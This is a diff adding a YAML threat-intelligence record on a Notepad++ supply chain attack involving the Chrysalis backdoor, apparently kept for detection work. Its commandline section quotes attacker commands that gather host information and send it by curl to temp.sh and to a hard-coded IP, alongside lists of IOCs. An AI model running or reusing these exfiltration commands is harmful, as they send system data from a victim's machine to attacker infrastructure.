@@ -1,0 +1,52 @@
+description: Notepad++ supply chain attack involving three infection chains using
+  malicious updates, Lua scripts, and Chrysalis backdoor.
+malware_families:
+- Chrysalis
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - cmd /c whoami&&tasklist > exfiltrate.txt
+  - curl.exe -F "file=@exfiltrate.txt" -s https://temp.sh/upload
+  - curl.exe --user-agent "https://temp.sh/<id>/exfiltrate.txt" -s http://45.76.155.202
+  powershell: []
+  scripting_engine:
+  - Lua
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ChrysalisService
+  image_load:
+  - log.dll
+  - BluetoothService.exe
+  network_connections:
+  - curl.exe -> https://temp.sh/upload
+  - curl.exe -> http://45.76.155.202
+  - BluetoothService.exe -> https://api.skycloudcenter.com/a/chat/s/70521ddf-a2ef-4adf9cf0-6d8e24aaa821
+  file_activity:
+  - '%appdata%\ProShow\load'
+  - '%APPDATA%\Adobe\Scripts\alien.ini'
+  - '%appdata%\Bluetooth\log.dll'
+  - '%appdata%\Bluetooth\BluetoothService.exe'
+  - '%appdata%\Bluetooth\BluetoothService'
+  persistence:
+  - Changing registry keys to install new services
+  process_relations: []
+CVEs:
+- CVE-2026-24061
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 45.76.155.202
+  domains:
+  - temp.sh
+  - api.skycloudcenter.com
+  urls:
+  - http://45.76.155.202/update/update.exe
+  - https://temp.sh/upload
+  - https://api.skycloudcenter.com/a/chat/s/70521ddf-a2ef-4adf9cf0-6d8e24aaa821
+authors:
+- G. Kucherin
+- I. Feigl
+reference: https://www.picussecurity.com/resource/blog/notepad-supply-chain-attack-chrysalis-backdoor
+date_of_publication: March 04, 2026
+file_creation_date: March 04, 2026
